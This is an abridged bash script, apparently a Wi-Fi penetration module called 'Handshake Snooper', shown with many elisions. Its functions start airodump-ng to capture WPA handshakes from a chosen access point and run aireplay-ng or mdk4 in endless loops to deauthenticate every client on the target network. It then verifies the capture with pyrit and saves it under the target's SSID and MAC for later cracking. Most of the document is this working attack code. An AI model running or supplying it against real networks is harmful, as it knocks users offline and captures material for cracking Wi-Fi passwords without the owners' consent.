...
handshake_snooper_header() {
  pent_header; pent_target_show; echo
}
...
handshake_snooper_arbiter_daemon() {
  ...
  handshake_snooper_arbiter_daemon_abort() {
    ...
    echo -e "[$now] $HandshakeSnooperArbiterAbortedWarning" >> \
      "$PENTWorkspacePath/handshake_snooper.log"
    exit 2
  }
  ...
  sandbox_remove_workfile "$PENTWorkspacePath/capture/dump-*"

  # Display some feedback to the user to assure verifier is working.
  xterm $PENTHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" \
    -title "Handshake Snooper Arbiter Log" -e \
    "tail -f \"$PENTWorkspacePath/handshake_snooper.log\"" &
  ...
  while [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; do
    ...
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" ]; then
      ...
      handshake_snooper_stop_deauthenticator
      handshake_snooper_stop_captor
      mv "$PENTWorkspacePath/capture/dump-01.cap" \
        "$PENTWorkspacePath/capture/recent.cap"
    else
      if [ -x "$(command -v pyrit)" ]; then
        pyrit -r "$PENTWorkspacePath/capture/dump-01.cap" \
          -o "$PENTWorkspacePath/capture/recent.cap" stripLive &> \
          $PENTOutputDevice
      else
        mv "$PENTWorkspacePath/capture/dump-01.cap" \
           "$PENTWorkspacePath/capture/recent.cap" &> $PENTOutputDevice
      fi
    fi
    ...
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" -a \
      ...
      sandbox_remove_workfile "$PENTWorkspacePath/capture/*"
  ...
  mkdir -p "$PENTPath/attacks/Handshake Snooper/handshakes/"

  # Move handshake to storage if one was acquired.
  mv "$PENTWorkspacePath/capture/recent.cap" \
    "$PENTPath/attacks/Handshake Snooper/handshakes/$PentTargetSSIDClean-$PentTargetMAC.cap"
...
handshake_snooper_stop_captor() {
  if [ "$HandshakeSnooperCaptorPID" ]; then
    kill -s SIGINT $HandshakeSnooperCaptorPID &> $PENTOutputDevice
  fi
...
handshake_snooper_start_captor() {
  ...
  xterm $PENTHoldXterm -title "Handshake Captor (CH $PentTargetChannel)" \
    $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
    airodump-ng --ignore-negative-one -d $PentTargetMAC -w "$PENTWorkspacePath/capture/dump" -c $PentTargetChannel -a $HandshakeSnooperJammerInterface &
  local parentPID=$!
...
handshake_snooper_stop_deauthenticator() {
  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
    kill $HandshakeSnooperDeauthenticatorPID &> $PENTOutputDevice
  fi
...
handshake_snooper_start_deauthenticator() {
  ...
  case "$HandshakeSnooperDeauthenticatorIdentifier" in
    "$HandshakeSnooperMdk4MethodOption")
      echo "$PentTargetMAC" > $PENTWorkspacePath/mdk4_blacklist.lst ;;
  esac

  # Start deauthenticators.
  case "$HandshakeSnooperDeauthenticatorIdentifier" in
    "$HandshakeSnooperAireplayMethodOption")
      xterm $PENTHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
        -title "Deauthenticating all clients on $PentTargetSSID" -e \
        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $PentTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
      HandshakeSnooperDeauthenticatorPID=$!
    ;;
    "$HandshakeSnooperMdk4MethodOption")
            xterm $PENTHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
                -title "Deauthenticating all clients on $PentTargetSSID" -e \
                "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $PENTWorkspacePath/mdk4_blacklist.lst -c $PentTargetChannel; done" &
            HandshakeSnooperDeauthenticatorPID=$!
    ;;
  esac
}
...
handshake_snooper_set_jammer_interface() {
  ...
  if [ ! "$HandshakeSnooperJammerInterfaceOriginal" ]; then
    ...
    HandshakeSnooperJammerInterfaceOriginal=$PentInterfaceSelected
  fi
  ...
  HandshakeSnooperJammerInterface=${PentInterfaces[$selectedInterface]}
}
...
handshake_snooper_set_verifier_identifier() {
  ...
  io_query_choice "$PENTHashVerificationMethodQuery" choices[@]
...
handshake_snooper_set_verifier_interval() {
  ...
  local choices=("$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval60SOption" "$HandshakeSnooperVerifierInterval90SOption" "$PENTGeneralBackOption")
...
if [ ! "$HandshakeSnooperCLIArguments" ]; then
  if ! HandshakeSnooperCLIArguments=$(
    getopt --options="v:i:j:a" \
      ...
      --name="Handshake Snooper V$PENTVersion.$PENTRevision" -- "$@"
    );then
...
prep_attack() {
  mkdir -p "$PENTWorkspacePath/capture"
  ...
  if ! pent_do_sequence handshake_snooper sequence[@]; then
    return 1
  fi
...
stop_attack() {
  if [ "$HandshakeSnooperArbiterPID" ]; then
    kill -s SIGABRT $HandshakeSnooperArbiterPID &> $PENTOutputDevice
  fi
...
start_attack() {
  ...
  handshake_snooper_arbiter_daemon $$ &> $PENTOutputDevice &
  HandshakeSnooperArbiterPID=$!
}
